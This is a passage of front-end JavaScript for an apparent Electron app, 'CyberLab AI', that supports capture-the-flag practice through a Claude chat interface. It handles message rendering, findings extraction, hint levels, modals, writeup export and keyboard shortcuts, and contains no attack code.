  container.appendChild(welcome);
}

function appendMessageToDOM(container, msg, tab) {
  const div = document.createElement('div');
  div.className = `chat-msg chat-msg-${msg.role}`;
  div.dataset.msgId = msg.id || '';

  if (msg.role === 'user') {
    div.innerHTML = `
      <div class="chat-msg-meta">
        <span class="chat-msg-role">YOU</span>
        <span class="chat-msg-time">${formatTime(msg.timestamp)}</span>
      </div>
      <div class="chat-msg-body">${formatUserMessage(msg)}</div>
    `;
  } else {
    div.innerHTML = `
      <div class="chat-msg-meta">
        <span class="chat-msg-role">CYBERLAB AI</span>
        <span class="chat-msg-time">${formatTime(msg.timestamp)}</span>
        <button class="chat-copy-btn" title="Copy response">⧉ Copy</button>
      </div>
      <div class="chat-msg-body">${renderAiMessage(msg.content, tab)}</div>
    `;
    const copyBtn = div.querySelector('.chat-copy-btn');
    if (copyBtn) copyBtn.addEventListener('click', () => copyToClipboard(msg.content));
  }

  // Auto-extracted findings pills (shown under AI messages)
  if (msg.findings && msg.findings.length > 0) {
    const badgeRow = document.createElement('div');
    badgeRow.className = 'finding-badge-row';

    // Label
    const lbl = document.createElement('span');
    lbl.className = 'ai-section-label';
    lbl.textContent = 'AUTO-EXTRACTED FINDINGS';
    badgeRow.appendChild(lbl);

    // Pills
    const pillsRow = document.createElement('div');
    pillsRow.className = 'auto-findings-row';
    msg.findings.forEach(f => {
      const pill = document.createElement('span');
      const type = (f.type || 'unknown').toUpperCase();
      pill.className = `auto-finding-pill ${type}`;
      const typeIcons = { PORT:'🔌', CRED:'🔑', CVE:'⚠️', FLAG:'🚩', FILE:'📄', SERVICE:'⚙️', USER:'👤', HASH:'#️⃣' };
      const icon = typeIcons[type] || '•';
      const valShort = f.value.length > 28 ? f.value.slice(0, 28) + '…' : f.value;
      pill.textContent = `${icon} ${type}:${valShort}`;
      pill.title = f.value;
      pillsRow.appendChild(pill);
    });
    badgeRow.appendChild(pillsRow);
    div.appendChild(badgeRow);
  }

  // Images
  if (msg.images && msg.images.length > 0) {
    const imgRow = document.createElement('div');
    imgRow.className = 'chat-msg-images';
    msg.images.forEach(src => {
      const img = document.createElement('img');
      img.src = src;
      img.className = 'chat-msg-image';
      img.alt = 'Attached image';
      imgRow.appendChild(img);
    });
    div.appendChild(imgRow);
  }

  container.appendChild(div);

  // Highlight code blocks
  if (msg.role === 'assistant' && typeof hljs !== 'undefined') {
    div.querySelectorAll('pre code').forEach(block => hljs.highlightElement(block));
  }

  // Wire command copy buttons inside AI messages
  div.querySelectorAll('.cmd-copy-btn').forEach(btn => {
    btn.addEventListener('click', () => copyToClipboard(btn.dataset.cmd || btn.closest('.cmd-block')?.querySelector('code')?.textContent || ''));
  });

  return div;
}

function formatUserMessage(msg) {
  let text = escHtml(msg.content || '');
  if (msg.images && msg.images.length > 0) {
    text += `<span class="img-attach-indicator">📎 ${msg.images.length} image${msg.images.length > 1 ? 's' : ''} attached</span>`;
  }
  return `<p>${text.replace(/\n/g, '<br>')}</p>`;
}

function renderAiMessage(content, tab) {
  if (!content) return '';
  // Ensure content is always a string — AI response may arrive as object in some error states
  if (typeof content !== 'string') {
    try { content = JSON.stringify(content, null, 2); }
    catch(e) { content = String(content); }
  }

  // Parse sections: ```code```, **bold**, bullet lists, numbered lists
  let html = '';
  const lines = content.split('\n');
  let inCode = false;
  let codeLang = '';
  let codeLines = [];
  let inList = false;
  let listHtml = '';

  const flushList = () => {
    if (inList) { html += `<ul>${listHtml}</ul>`; listHtml = ''; inList = false; }
  };

  for (let i = 0; i < lines.length; i++) {
    const line = typeof lines[i] === 'string' ? lines[i] : String(lines[i] ?? '');

    if (line.startsWith('```')) {
      if (!inCode) {
        flushList();
        inCode = true;
        codeLang = line.slice(3).trim() || 'bash';
        codeLines = [];
      } else {
        inCode = false;
        const codeText = codeLines.join('\n');
        html += `
          <div class="cmd-block">
            <div class="cmd-block-header">
              <span class="cmd-lang">${escHtml(codeLang)}</span>
              <button class="cmd-copy-btn" data-cmd="${escHtml(codeText)}">⧉ Copy</button>
            </div>
            <pre><code class="language-${escHtml(codeLang)}">${escHtml(codeText)}</code></pre>
          </div>
        `;
        codeLines = [];
        codeLang = '';
      }
      continue;
    }

    if (inCode) { codeLines.push(line); continue; }

    // Heading
    if (line.startsWith('### ')) {
      flushList();
      html += `<h4 class="ai-heading">${escHtml(line.slice(4))}</h4>`;
      continue;
    }
    if (line.startsWith('## ')) {
      flushList();
      html += `<h3 class="ai-heading">${escHtml(line.slice(3))}</h3>`;
      continue;
    }
    if (line.startsWith('# ')) {
      flushList();
      html += `<h2 class="ai-heading">${escHtml(line.slice(2))}</h2>`;
      continue;
    }

    // Bullet list
    if (line.match(/^[-*]\s/)) {
      inList = true;
      const text = inlineMd(line.slice(2));
      listHtml += `<li>${text}</li>`;
      continue;
    }

    // Numbered list
    if (line.match(/^\d+\.\s/)) {
      flushList();
      html += `<ol>${''}`;
      // Simple handling — accumulate numbered
      html += `<li>${inlineMd(line.replace(/^\d+\.\s/, ''))}</li>`;
      continue;
    }

    // Horizontal rule
    if (line.match(/^---+$/)) {
      flushList();
      html += '<hr class="ai-divider">';
      continue;
    }

    // Finding tags — render inline badge
    if (line.includes('[FINDING:')) {
      flushList();
      const rendered = line.replace(/\[FINDING:(\w+)\]\s*(.+)/g, (_, type, val) => {
        return `<span class="inline-finding-badge inline-finding-${type.toLowerCase()}">[${escHtml(type)}] ${escHtml(val.trim())}</span>`;
      });
      html += `<p>${inlineMd(rendered.includes('inline-finding') ? rendered : escHtml(line))}</p>`;
      continue;
    }

    // Empty line
    if (line.trim() === '') {
      flushList();
      html += '<br>';
      continue;
    }

    // Normal paragraph
    flushList();
    html += `<p>${inlineMd(line)}</p>`;
  }

  flushList();
  if (inCode && codeLines.length > 0) {
    html += `<pre><code>${escHtml(codeLines.join('\n'))}</code></pre>`;
  }

  return html;
}

function inlineMd(text) {
  if (!text) return '';
  // Already escaped or has HTML? pass through for finding badges
  if (text.includes('class="inline-finding')) return text;
  text = escHtml(text);
  // Bold
  text = text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  // Italic
  text = text.replace(/\*(.+?)\*/g, '<em>$1</em>');
  // Inline code
  text = text.replace(/`(.+?)`/g, '<code class="inline-code">$1</code>');
  // Links
  text = text.replace(/\[(.+?)\]\((.+?)\)/g, '<a href="#" class="ai-link" data-href="$2">$1</a>');
  return text;
}

function showTypingIndicator() {
  const container = $('#chat-history');
  if (!container) return;
  removeTypingIndicator();
  const div = document.createElement('div');
  div.id = 'typing-indicator';
  div.className = 'chat-msg chat-msg-assistant typing-indicator';
  div.innerHTML = `
    <div class="chat-msg-meta"><span class="chat-msg-role">CYBERLAB AI</span></div>
    <div class="chat-msg-body"><span class="typing-dots"><span></span><span></span><span></span></span></div>
  `;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function removeTypingIndicator() {
  const ind = $('#typing-indicator');
  if (ind) ind.remove();
}

function scrollChatToBottom() {
  const container = $('#chat-history');
  if (container) container.scrollTop = container.scrollHeight;
}

async function sendChatMessage(overrideText) {
  const tab = getActiveTab();
  if (!tab) return;

  const input = $('#message-input');
  const text = overrideText || (input ? input.value.trim() : '');
  if (!text && tab.pendingImages.length === 0) return;

  if (!AppState.apiKeyValid && !overrideText) {
    showToast('No API key set — go to Settings to add your Claude API key', 'error', 4000);
    return;
  }

  // Clear input
  if (input && !overrideText) { input.value = ''; autoResizeInput(input); }

  // Build user message
  const userMsg = {
    id: generateId(),
    role: 'user',
    content: text,
    images: [...tab.pendingImages],
    timestamp: Date.now(),
  };
  tab.pendingImages = [];
  updateImagePreviewBar();

  // Update chat history
  tab.chatHistory.push(userMsg);

  // Re-render (or append)
  const container = $('#chat-history');
  const welcomeEl = container?.querySelector('.chat-welcome');
  if (welcomeEl) welcomeEl.remove();
  if (container) appendMessageToDOM(container, userMsg, tab);

  // Show typing
  showTypingIndicator();
  scrollChatToBottom();

  // Disable send button
  const sendBtn = $('#send-btn');
  if (sendBtn) sendBtn.disabled = true;

  try {
    // Build API messages array
    const apiMessages = buildApiMessages(tab);

    // System prompt
    const systemPrompt = buildSystemPrompt(tab.session, tab.hintLevel, tab.teachMeMode);

    // Call Claude
    const response = await window.electronAPI.claudeChat({
      system: systemPrompt,
      messages: apiMessages,
      images: userMsg.images,
    });

    removeTypingIndicator();

    // Parse findings from response
    const extracted = parseFindings(response);
    extracted.forEach(f => sessionAddFinding(tab.session, f));

    // Build AI message
    const aiMsg = {
      id: generateId(),
      role: 'assistant',
      content: response,
      timestamp: Date.now(),
      findings: extracted,
    };
    tab.chatHistory.push(aiMsg);

    if (container) appendMessageToDOM(container, aiMsg, tab);
    scrollChatToBottom();

    // Update findings panel
    renderFindingsList(tab);

    // Check achievements
    const newAchievements = checkAchievements(AppState.progressData, tab.session, tab.chatHistory);
    newAchievements.forEach(a => triggerAchievement(a));

    // Play sounds
    if (AppState.config.soundEnabled) {
      if (extracted.some(f => f.type === 'FLAG')) Sounds.flag();
      else if (extracted.length > 0) Sounds.finding();
    }

    // Update methodology if flag found
    if (extracted.some(f => f.type === 'FLAG')) {
      if (tab.session.methodologyStep < 6) tab.session.methodologyStep = 6;
      renderMethodologyTracker(tab);
    }

    // Autosave
    if (AppState.config.autosaveEnabled) autoSaveTab(tab);

    // Tab rename update
    renderTabBar();

  } catch (e) {
    removeTypingIndicator();
    if (AppState.config.soundEnabled) Sounds.apiError();

    const errMsg = {
      id: generateId(),
      role: 'assistant',
      content: `**Error:** ${e.message}\n\nPlease check your API key in Settings or try again.`,
      timestamp: Date.now(),
      isError: true,
      findings: [],
    };
    tab.chatHistory.push(errMsg);
    if (container) appendMessageToDOM(container, errMsg, tab);
    scrollChatToBottom();
    showToast('API error: ' + e.message, 'error', 5000);
  } finally {
    if (sendBtn) sendBtn.disabled = false;
    if (input) input.focus();
  }
}

function buildApiMessages(tab) {
  // Trim to last 20 messages to stay within context limits
  const history = tab.chatHistory.slice(-20);
  return history.map(msg => ({
    role: msg.role === 'user' ? 'user' : 'assistant',
    content: msg.content || '',
  }));
}

// =============================================================================
// SECTION 2J — CHAT INPUT WIRING
// =============================================================================

function wireChatInput() {
  const input = $('#message-input');
  const sendBtn = $('#send-btn');
  const imageDropZone = $('#image-drop-zone');

  if (input) {
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendChatMessage();
      }
    });
    input.addEventListener('input', () => autoResizeInput(input));

    // Snippet search trigger — type :: to open
    input.addEventListener('keyup', (e) => {
      if (input.value.endsWith('::')) {
        input.value = input.value.slice(0, -2);
        openSnippetSearch();
      }
    });

    // Paste image
    input.addEventListener('paste', (e) => {
      const items = e.clipboardData?.items;
      if (!items) return;
      for (const item of items) {
        if (item.type.startsWith('image/')) {
          const file = item.getAsFile();
          if (file) handleImageFile(file);
        }
      }
    });
  }

  if (sendBtn) sendBtn.addEventListener('click', () => sendChatMessage());

  // Image attach button
  const attachBtn = $('#image-attach-btn');
  const fileInput = $('#image-file-input');
  if (attachBtn && fileInput) {
    attachBtn.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', () => {
      Array.from(fileInput.files || []).forEach(handleImageFile);
      fileInput.value = '';
    });
  }

  // Drag-drop onto chat area
  const chatArea = $('#center-panel') || $('#chat-history');
  if (chatArea) {
    chatArea.addEventListener('dragover', (e) => { e.preventDefault(); chatArea.classList.add('drag-over'); });
    chatArea.addEventListener('dragleave', () => chatArea.classList.remove('drag-over'));
    chatArea.addEventListener('drop', (e) => {
      e.preventDefault();
      chatArea.classList.remove('drag-over');
      Array.from(e.dataTransfer.files).forEach(f => {
        if (f.type.startsWith('image/')) handleImageFile(f);
      });
    });
  }

  // Quick pills at bottom of chat
  const quickPills = $('#quick-pills');
  if (quickPills) {
    quickPills.querySelectorAll('.pill[data-prompt]').forEach(pill => {
      if (pill.id === 'add-custom-pill') return; // handled separately
      pill.addEventListener('click', () => {
        const prompt = pill.dataset.prompt;
        if (prompt === 'TEACH_ME') {
          // Toggle teach me mode
          const tab = getActiveTab();
          if (tab) {
            tab.teachMeMode = !tab.teachMeMode;
            const badge = $('#teach-me-badge');
            if (badge) badge.style.display = tab.teachMeMode ? '' : 'none';
            showToast(tab.teachMeMode ? 'Teach Me Mode ON' : 'Teach Me Mode OFF', 'info', 1500);
          }
        } else {
          sendChatMessage(prompt);
        }
      });
    });

    // Custom pill — prompts for custom text
    const customPill = $('#add-custom-pill');
    if (customPill) {
      customPill.addEventListener('click', () => {
        const inp = $('#message-input');
        if (inp) { inp.focus(); inp.placeholder = 'Type your custom prompt…'; }
      });
    }
  }

  // Terminal output toggle (Paste terminal output)
  const termToggle = $('#terminal-toggle');
  const termArea = $('#terminal-output-area');
  if (termToggle && termArea) {
    termToggle.addEventListener('click', () => {
      const open = termArea.style.display !== 'none' && termArea.style.display !== '';
      termArea.style.display = open ? 'none' : 'block';
      termToggle.textContent = open ? '▶ Paste terminal output' : '▼ Hide terminal paste';
    });
  }

  // Context selector — cycle context depth
  const ctxSel = $('#context-selector');
  if (ctxSel) {
    ctxSel.addEventListener('click', () => {
      const tab = getActiveTab();
      if (!tab) return;
      const modes = ['minimal', 'standard', 'full'];
      const cur = tab.contextMode || 'standard';
      tab.contextMode = modes[(modes.indexOf(cur) + 1) % modes.length];
      const nameEl = $('#context-session-name');
      if (nameEl) nameEl.textContent = `${tab.session?.name || '—'} (${tab.contextMode})`;
    });
  }

  // Auto-commands toggle
  const autoCmdStatus = $('#auto-cmd-status');
  const autoCmdBar = autoCmdStatus?.closest('.auto-cmd-indicator');
  if (autoCmdBar) {
    autoCmdBar.style.cursor = 'pointer';
    autoCmdBar.addEventListener('click', () => {
      const tab = getActiveTab();
      if (!tab) return;
      tab.autoCmd = !tab.autoCmd;
      if (autoCmdStatus) {
        autoCmdStatus.textContent = tab.autoCmd !== false ? 'ON' : 'OFF';
        autoCmdStatus.className = tab.autoCmd !== false ? 'auto-cmd-on' : 'auto-cmd-off';
      }
    });
  }

  // Hint level buttons
  wireHintControls();

  // Teach me button (button, not checkbox)
  const teachBtn = $('#teach-me-btn');
  if (teachBtn) {
    teachBtn.addEventListener('click', () => {
      const tab = getActiveTab();
      if (tab) {
        tab.teachMeMode = !tab.teachMeMode;
        teachBtn.classList.toggle('active', tab.teachMeMode);
        const badge = $('#teach-me-badge');
        if (badge) badge.style.display = tab.teachMeMode ? '' : 'none';
        showToast(tab.teachMeMode ? '📚 Teach Me Mode ON' : 'Teach Me Mode OFF', 'info', 1800);
      }
    });
  }

  // Mark complete / Done button
  const saveBtn = $('#mark-complete-btn');
  if (saveBtn) saveBtn.addEventListener('click', manualSaveSession);

  // Writeup button
  const writeupBtn = $('#writeup-btn');
  if (writeupBtn) writeupBtn.addEventListener('click', () => showWriteupModal());

  // Generate writeup from target panel button
  const genWriteupBtn = $('#generate-writeup-btn');
  if (genWriteupBtn) genWriteupBtn.addEventListener('click', () => showWriteupModal());

  // Summary button
  const summaryBtn = $('#summary-btn');
  if (summaryBtn) summaryBtn.addEventListener('click', () => showSessionSummaryModal());

  // Add finding manually
  const addFindingBtn = $('#add-finding-btn');
  if (addFindingBtn) addFindingBtn.addEventListener('click', () => showModal('add-finding-modal'));
}

function autoResizeInput(input) {
  input.style.height = 'auto';
  input.style.height = Math.min(input.scrollHeight, 200) + 'px';
}

function handleImageFile(file) {
  const tab = getActiveTab();
  if (!tab) return;
  if (tab.pendingImages.length >= 3) { showToast('Max 3 images per message', 'warning'); return; }
  const reader = new FileReader();
  reader.onload = (e) => {
    tab.pendingImages.push(e.target.result);
    updateImagePreviewBar();
  };
  reader.readAsDataURL(file);
}

function updateImagePreviewBar() {
  const tab = getActiveTab();
  const bar = $('#image-preview-area');
  if (!bar) return;
  if (!tab || tab.pendingImages.length === 0) {
    bar.innerHTML = '';
    bar.style.display = 'none';
    return;
  }
  bar.style.display = 'flex';
  bar.innerHTML = tab.pendingImages.map((src, i) => `
    <div class="img-preview-thumb">
      <img src="${src}" alt="img ${i + 1}">
      <button class="img-remove-btn" data-idx="${i}">×</button>
    </div>
  `).join('');
  bar.querySelectorAll('.img-remove-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      tab.pendingImages.splice(parseInt(btn.dataset.idx), 1);
      updateImagePreviewBar();
    });
  });
}

// =============================================================================
// SECTION 2K — HINT LADDER
// =============================================================================

function wireHintControls() {
  // HTML uses a range slider (#hint-slider) for hint level — wire it
  const slider = $('#hint-slider');
  if (slider) {
    slider.addEventListener('input', () => {
      const tab = getActiveTab();
      if (tab) {
        tab.hintLevel = parseInt(slider.value, 10);
        updateHintLevelDisplay(tab);
      }
    });
  }

  // Legacy up/down buttons (null-safe if not present)
  const hintDown = $('#hint-level-down');
  const hintUp = $('#hint-level-up');
  if (hintDown) hintDown.addEventListener('click', () => {
    const tab = getActiveTab();
    if (tab && tab.hintLevel > 1) { tab.hintLevel--; updateHintLevelDisplay(tab); }
  });
  if (hintUp) hintUp.addEventListener('click', () => {
    const tab = getActiveTab();
    if (tab && tab.hintLevel < 5) { tab.hintLevel++; updateHintLevelDisplay(tab); }
  });
}

function updateHintLevelDisplay(tab) {
  const labels = ['', 'Nudge', 'Pointed Hint', 'Strong Hint', 'Near Solution', 'Full Solution'];

  // Level name label
  const el = $('#hint-level-name');
  if (el) el.textContent = `Level ${tab.hintLevel} — ${labels[tab.hintLevel]}`;

  // Badge (L1, L2…)
  const badge = $('#hint-level-badge');
  if (badge) badge.textContent = `L${tab.hintLevel}`;

  // Range slider value
  const slider = $('#hint-slider');
  if (slider) slider.value = tab.hintLevel;

  // Hint float badge in focus mode
  const hintFloat = $('#focus-hint-float');
  if (hintFloat) hintFloat.textContent = `Hint: ${labels[tab.hintLevel]}`;

  const focusHintLevel = $('#focus-hint-level');
  if (focusHintLevel) focusHintLevel.textContent = tab.hintLevel;
}

// =============================================================================
// SECTION 2L — FOCUS MODE
// =============================================================================

function toggleFocusMode() {
  AppState.focusMode = !AppState.focusMode;
  document.body.classList.toggle('focus-mode', AppState.focusMode);

  const pill = $('#focus-exit-pill');
  if (pill) pill.style.display = AppState.focusMode ? 'flex' : 'none';

  const hintFloat = $('#focus-hint-float');
  if (hintFloat) hintFloat.style.display = AppState.focusMode ? 'flex' : 'none';

  if (AppState.config.soundEnabled) Sounds.focusToggle();

  showToast(AppState.focusMode ? 'Focus Mode ON — press Esc or the pill to exit' : 'Focus Mode OFF', 'info', 2000);
}

// =============================================================================
// SECTION 2M — RIGHT PANEL TABS
// =============================================================================

function renderRightPanelForTab(tab) {
  // Refresh v2 right panel (notes re-render per tab, tools stay constant)
  if (typeof renderNotesPanel === 'function') renderNotesPanel(tab, 'notes');
}

function wireChatSidePanel() {
  // Wire right panel tab buttons ONCE (HTML: class="right-tab", data-tab="builder")
  $$('.right-tab').forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.dataset.tab;
      $$('.right-tab').forEach(b => b.classList.toggle('active', b === btn));
      $$('.right-tab-content').forEach(c => c.classList.toggle('active', c.id === `tab-${tabId}`));
    });
  });

  // Wire Refs tab external link buttons
  $$('.ref-link').forEach(btn => {
    btn.addEventListener('click', () => {
      const url = btn.dataset.url;
      if (url) window.electronAPI.openExternal(url);
    });
  });

  // Command builder tab
  wireCommandBuilderPanel();

  // Reverse shell tab
  wireRevshellPanel();

  // Encoder tab
  wireEncoderPanel();

  // Cheatsheet tab
  wireCheatsheetPanel();

  // Notes tab
  wireNotesPanel();
}

// =============================================================================
// SECTION 2N — ACHIEVEMENT TOAST
// =============================================================================

function triggerAchievement(achievement) {
  const toast = $('#achievement-toast');
  if (!toast) return;

  const nameEl = toast.querySelector('.achievement-name');
  const descEl = toast.querySelector('.achievement-desc');
  const iconEl = toast.querySelector('.achievement-icon');

  if (nameEl) nameEl.textContent = achievement.name || '';
  if (descEl) descEl.textContent = achievement.description || '';
  if (iconEl) iconEl.textContent = achievement.icon || '🏆';

  toast.classList.add('show');
  if (AppState.config.soundEnabled) Sounds.achievement();

  setTimeout(() => toast.classList.remove('show'), 5000);

  // Save achievement
  if (!AppState.progressData.achievements.includes(achievement.id)) {
    AppState.progressData.achievements.push(achievement.id);
    saveProgressData();
  }
}

// =============================================================================
// SECTION 2O — PERSISTENCE
// =============================================================================

async function loadProgressData() {
  try {
    const data = await window.electronAPI.loadProgress();
    if (data) AppState.progressData = data;
  } catch (_) {}
}

async function saveProgressData() {
  try {
    await window.electronAPI.saveProgress(AppState.progressData);
  } catch (_) {}
}

async function loadLabTrackerData() {
  try {
    const data = await window.electronAPI.loadLabTracker();
    if (data) AppState.labsData = data;
    pushCyberLabStatus();
  } catch (_) {}
}

async function saveLabTrackerData() {
  try {
    await window.electronAPI.saveLabTracker(AppState.labsData);
    pushCyberLabStatus();
  } catch (_) {}
}

async function loadSnippetsData() {
  try {
    const data = await window.electronAPI.loadSnippets();
    if (data) AppState.snippetsData = data;
  } catch (_) {}
}

async function saveSnippetsData() {
  try {
    await window.electronAPI.saveSnippets(AppState.snippetsData);
  } catch (_) {}
}

// =============================================================================
// SECTION 2P — MODAL WIRING
// =============================================================================

function wireModals() {
  // Wire ALL close buttons — HTML uses data-close="modal-id" on .modal-close and Cancel btns
  $$('[data-close]').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.dataset.close;
      if (targetId) hideModal(targetId);
      // Also close by traversal in case of legacy usage
      const overlay = btn.closest('.modal-overlay');
      if (overlay && !targetId) overlay.classList.remove('open');
    });
  });

  // Close on backdrop click (.modal-overlay is the backdrop)
  $$('.modal-overlay').forEach(overlay => {
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) overlay.classList.remove('open');
    });
  });

  // New session modal
  const nsConfirm = $('#create-session-btn');
  if (nsConfirm) nsConfirm.addEventListener('click', confirmNewSession);
  const nsCancel = $('.btn[data-close="new-session-modal"]');
  if (nsCancel) nsCancel.addEventListener('click', () => hideModal('new-session-modal'));

  // Add finding modal
  wireAddFindingModal();

  // Snippet modal
  wireSnippetModal();

  // Lab modal
  wireLabModal();

  // Writeup modal
  wireWriteupModal();

  // Session summary modal
  wireSessionSummaryModal();

  // Bulk import modal
  wireBulkImportModal();

  // Confirm modal
  wireConfirmModal();

  // New tab / new session button (tab bar + button)
  const newTabBtn = $('#new-tab-btn');
  if (newTabBtn) newTabBtn.addEventListener('click', () => showNewSessionModal());
}

function wireAddFindingModal() {
  const confirmBtn = $('#confirm-add-finding');
  if (confirmBtn) {
    confirmBtn.addEventListener('click', () => {
      const type = $('#finding-type-select')?.value || 'UNKNOWN';
      const value = ($('#finding-value-input')?.value || '').trim();
      if (!value) { showToast('Please enter a value', 'warning'); return; }

      const tab = getActiveTab();
      if (tab) {
        sessionAddFinding(tab.session, { type, value, manual: true, timestamp: Date.now() });
        renderFindingsList(tab);
        if (AppState.config.soundEnabled) Sounds.finding();
      }
      hideModal('add-finding-modal');
      const valInput = $('#finding-value-input');
      if (valInput) valInput.value = '';
    });
  }
}

function wireConfirmModal() {
  // Confirm modal is triggered programmatically
  window._confirmCallback = null;

  const confirmBtn = $('#confirm-ok-btn');
  const cancelBtn = $('.btn[data-close="confirm-modal"]');

  if (confirmBtn) {
    confirmBtn.addEventListener('click', () => {
      hideModal('confirm-modal');
      if (typeof window._confirmCallback === 'function') window._confirmCallback(true);
    });
  }
  if (cancelBtn) {
    cancelBtn.addEventListener('click', () => {
      hideModal('confirm-modal');
      if (typeof window._confirmCallback === 'function') window._confirmCallback(false);
    });
  }
}

function showConfirm(message, callback) {
  const msgEl = $('#confirm-msg');
  if (msgEl) msgEl.textContent = message;
  window._confirmCallback = callback;
  showModal('confirm-modal');
}

// =============================================================================
// SECTION 2Q — WRITEUP & SUMMARY MODALS
// =============================================================================

function wireWriteupModal() {
  const genBtn = $('#writeup-generate-btn');
  if (genBtn) {
    genBtn.addEventListener('click', async () => {
      const tab = getActiveTab();
      if (!tab) return;
      setButtonLoading(genBtn, true, 'Generating…');
      try {
        const prompt = buildWriteupSystemPrompt(tab.session, tab.chatHistory);
        const result = await window.electronAPI.claudeChat({
          system: prompt,
          messages: [{ role: 'user', content: buildWriteupContext(tab.session, tab.chatHistory) }],
        });
        const editor = $('#writeup-editor');
        if (editor) editor.value = result;
      } catch (e) {
        showToast('Generation failed: ' + e.message, 'error');
      }
      setButtonLoading(genBtn, false);
    });
  }

  const saveBtn = $('#writeup-save-btn');
  if (saveBtn) {
    saveBtn.addEventListener('click', async () => {
      const tab = getActiveTab();
      const content = $('#writeup-editor')?.value || '';
      if (!content) { showToast('Nothing to save', 'warning'); return; }
      try {
        await window.electronAPI.saveWriteup({ sessionId: tab?.session?.id, content, name: tab?.session?.name });
        showToast('Writeup saved!', 'success');
        hideModal('writeup-modal');
      } catch (e) {
        showToast('Save failed: ' + e.message, 'error');
      }
    });
  }

  const exportBtn = $('#writeup-export-btn');
  if (exportBtn) {
    exportBtn.addEventListener('click', async () => {
      const content = $('#writeup-editor')?.value || '';
      if (!content) return;
      const tab = getActiveTab();
      try {
        await window.electronAPI.exportPDF({ content, name: tab?.session?.name || 'writeup' });
        showToast('PDF exported!', 'success');
      } catch (e) {
        showToast('Export failed: ' + e.message, 'error');
      }
    });
  }

  const obsidianBtn = $('#writeup-obsidian-btn');
  if (obsidianBtn) {
    obsidianBtn.addEventListener('click', async () => {
      const content = $('#writeup-editor')?.value || '';
      const tab = getActiveTab();
      if (!AppState.config.obsidianVault) {
        showToast('No Obsidian vault configured — set it in Settings', 'warning');
        return;
      }
      try {
        await window.electronAPI.saveWriteup({
          sessionId: tab?.session?.id,
          content,
          name: tab?.session?.name,
          vault: AppState.config.obsidianVault,
          obsidian: true,
        });
        showToast('Saved to Obsidian vault!', 'success');
      } catch (e) {
        showToast('Obsidian save failed: ' + e.message, 'error');
      }
    });
  }
}

function showWriteupModal() {
  showModal('writeup-modal');
}

function wireSessionSummaryModal() {
  // Nothing to wire — populated when opened
}

function showSessionSummaryModal() {
  const tab = getActiveTab();
  if (!tab?.session) return;

  const s = tab.session;
  const mistakes = s.mistakes || [];
  const duration = s.startTime ? Date.now() - s.startTime : 0;

  // Flatten findings object into typed array
  const raw = s.findings;
  const findings = [];
  if (Array.isArray(raw)) {
    findings.push(...raw);
  } else if (raw && typeof raw === 'object') {
    [['ports','PORT'],['users','USER'],['credentials','CRED'],['flags','FLAG'],['cves','CVE'],['files','FILE'],['hashes','HASH'],['services','SERVICE']].forEach(([key,type]) => {
      (raw[key]||[]).forEach(f => findings.push({...f, type}));
    });
  }

  const container = $('#session-summary-body');
  if (container) {
    container.innerHTML = `
      <div class="summary-row"><span>Session</span><strong>${escHtml(s.name)}</strong></div>
      <div class="summary-row"><span>Platform</span><strong>${escHtml(s.platform || '—')}</strong></div>
      <div class="summary-row"><span>Difficulty</span><strong>${escHtml(s.difficulty || '—')}</strong></div>
      <div class="summary-row"><span>Duration</span><strong>${formatDuration(duration)}</strong></div>
      <div class="summary-row"><span>Findings</span><strong>${findings.length}</strong></div>
      <div class="summary-row"><span>Flags</span><strong>${findings.filter(f => f.type === 'FLAG').length}</strong></div>
      <div class="summary-row"><span>Messages</span><strong>${tab.chatHistory.length}</strong></div>
      <div class="summary-row"><span>Hints Used</span><strong>${mistakes.length}</strong></div>
      <div class="summary-section-title">Techniques Used</div>
      <div class="summary-tags">${(s.techniques || inferTechniques(tab.chatHistory)).map(t => `<span class="summary-tag">${escHtml(t)}</span>`).join('')}</div>
      <div class="summary-section-title">Key Findings</div>
      <div class="summary-findings">${findings.slice(0, 10).map(f => `<div class="summary-finding"><span class="sf-type">${escHtml(f.type)}</span><span class="sf-val">${escHtml(f.value||'')}</span></div>`).join('') || '<div style="color:var(--text-muted)">None captured</div>'}</div>
    `;
  }

  showModal('session-summary-modal');
}

// =============================================================================
// SECTION 2R — KEYBOARD SHORTCUTS
// =============================================================================

function wireKeyboardShortcuts() {
  document.addEventListener('keydown', (e) => {
    // Escape — exit focus mode or close modal
    if (e.key === 'Escape') {
      if (AppState.focusMode) { toggleFocusMode(); return; }
      const openModal = $('.modal.open');
      if (openModal) { openModal.classList.remove('open'); openModal.setAttribute('hidden', ''); return; }
      if (AppState.snippetSearchOpen) { closeSnippetSearch(); return; }
    }

    // Ctrl/Cmd + K — snippet search
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
      e.preventDefault();
      openSnippetSearch();
      return;
    }

    // Ctrl/Cmd + S — save session
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
      e.preventDefault();
      manualSaveSession();
      return;
    }

    // Ctrl/Cmd + T — new tab
    if ((e.ctrlKey || e.metaKey) && e.key === 't') {
      e.preventDefault();
      createTab();
      return;
    }

    // Ctrl/Cmd + W — close tab
    if ((e.ctrlKey || e.metaKey) && e.key === 'w') {
      e.preventDefault();
      if (AppState.activeTabId) closeTab(AppState.activeTabId);
      return;
    }

    // Ctrl/Cmd + 1-5 — switch tabs
    if ((e.ctrlKey || e.metaKey) && e.key >= '1' && e.key <= '5') {
      e.preventDefault();
      const idx = parseInt(e.key) - 1;
      if (AppState.tabs[idx]) switchTab(AppState.tabs[idx].id);
      return;
    }

    // F11 — toggle focus mode
    if (e.key === 'F11') {
      e.preventDefault();
      toggleFocusMode();
      return;
    }
  });
}

// =============================================================================
// SECTION 2S — SNIPPET SEARCH OVERLAY
// =============================================================================

function openSnippetSearch() {
  const overlay = $('#snippet-search-overlay');
  if (!overlay) return;
  AppState.snippetSearchOpen = true;
  overlay.removeAttribute('hidden');
  const input = overlay.querySelector('#global-snippet-input');
  if (input) { input.value = ''; input.focus(); renderSnippetSearchResults(''); }
}

function closeSnippetSearch() {
  const overlay = $('#snippet-search-overlay');
  if (overlay) overlay.setAttribute('hidden', '');
